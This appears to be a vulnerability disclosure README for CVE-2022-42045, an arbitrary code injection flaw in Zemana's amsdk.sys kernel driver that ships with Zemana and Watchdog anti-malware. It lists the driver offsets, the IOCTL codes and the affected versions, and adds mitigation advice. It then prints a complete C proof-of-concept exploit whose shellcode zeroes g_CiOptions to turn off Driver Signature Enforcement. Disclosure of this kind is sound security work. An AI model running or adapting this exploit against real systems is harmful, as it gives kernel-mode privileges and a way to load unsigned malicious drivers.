# CVE-2022-42045
## Summary
  We discovered an Arbitrary code injection in Zemana amsdk.sys kernel-mode driver, a part of Zemana Antimalware SDK. The vulnerability allows to inject an arbitrary code into the one of the driver code sections and then to execute it with kernel-mode privileges (local privileges escalation from admin to kernel mode). This vulnerability could be used, for example, to disable Driver Signature Enforcement and then to install unsigned kernel-mode drivers.
## Details 
  The vulnerable function is placed at the offset 0xBF60 from the start of the .text section of amsdk.sys. This function invokes another one at the offset 0xD664. The function at the offset 0xD664 gets 4 arguments:
1. Target address: address of the function in .hook section with RWX access rights. In our case this argument points to the function at the offset 0x1D0 from the start of .hook sections
2. Source address: address of a source buffer with user controlled code
3. Some integer value. 128 in our case
4. Some address of a some function inside ntoskrnl.exe. This function is invoked just after invoking of the code from argument 2. BUT before it this argument value is increased by the length of a code from argument 2 minus 1. This length is calculated by the embedded to the driver lightweight disassembler. So, after the invoking of a code from argument 2 the control is transferred to the arg_4 + arg_2_length â€“ 1.
   IOCTL 0x80002044 calls the function at the offset 0xBF60 (.text section) and allows to fill the stub in .hook section by an arbitrary user controlled code. IOCTL 0x80002014 (read via SCSI) or IOCTL 0x80002014 (write via SCSI) transfers a control to this filled stub.
### Affected products
   At least Watchdog Anti-Malware 4.1.422 , Zemana AntiMalware 3.2.28. These products have the same vulnerable driver but signed with different certificates.
### Affected operating systems
  64-bit versions of Windows: from Windows 7 to Windows 11
## Mitigation
  Uninstall Zemana or Watchdog Antimalware products. Add driver signatures to blacklist.
  
  See the following code for the details:

    int Exploit(DWORD64 addr,bool modeSwitch,DWORD offset)
    {
      // Shellcode to zero g_CiOptions
      char shell[] = {/*push rbx*/ 0x53,/*mov rbx,value*/ 0x48, 0xbb,/*value*/0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00/*value*/,/*mov byte ptr[rbx],val*/ 0xC6, 0x03,/*val*/ 0x00/*val*/, /*push 0*/0x6a, 0x00, /*pop rax*/0x58, /*pop rbx*/0x5b,/*nop*/ 0x90, /*ret*/0xc3 };
      PDWORD64 shellCiOptionAddr = (PDWORD64)(shell + 3);
      *shellCiOptionAddr = addr;
      if (modeSwitch)
      {
        shell[13] = 0x06;
      }

      LPVOID a,b;

      a = VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      b = VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

      if (!a || !b)
        return -1;

      PBYTE foo = 0;

      // Store shellcode
      foo = (PBYTE)a + 0x108;
      for (int i = 0; i < sizeof(shell); i++)
      {
        foo[i] = shell[i];
      }

      PDWORD buf = 0;

      // Store the offset of the some function of ntoskrnl (for example KeAreApcsDisabled)
      buf = (PDWORD)((PBYTE)a + 0x104);
      *buf = offset;

      buf = (PDWORD)((PBYTE)a + 0x188);
      *buf = 0x0;


      HANDLE h = CreateFileW(L"\\\\.\\amsdk", 0xC0000000, 0x3, 0, 3, 0, 0);
      if (INVALID_HANDLE_VALUE == h)
      {
        cout << "Error create" << endl;
        return -1;
      }
      DWORD dw = 0;
      DWORD pid = GetCurrentProcessId();
      DWORD current = 0;

      BOOL c = DeviceIoControl(h, 0x80002010, &pid, 4, &current, 4, &dw, 0);
      if (!c)
      {
        cout << "Reg error" << endl;
        return -1;
      }
      c = DeviceIoControl(h, 0x80002044, a, (DWORD)0x1000, b, (DWORD)0x1000, &dw, 0);
      if (!c)
      {
        cout << "Stub filling error " << endl;
        return -1;
      }

      memset(a, 0, 0x10000);
      buf = (PDWORD)((PBYTE)a + 0x14);
      *buf = 0x200; 

      buf = (PDWORD)((PBYTE)a + 0x10);
      *buf = 0x5;

      c = DeviceIoControl(h, 0x80002014, a, (DWORD)0x1000, b, (DWORD)0x1000, &dw, 0);

      VirtualFree(a, 0, MEM_RELEASE);
      VirtualFree(b, 0, MEM_RELEASE);
      CloseHandle(h);

      return 0;
    }

![Result](https://github.com/ReCryptLLC/CVE-2022-42045/blob/main/PoC.png)
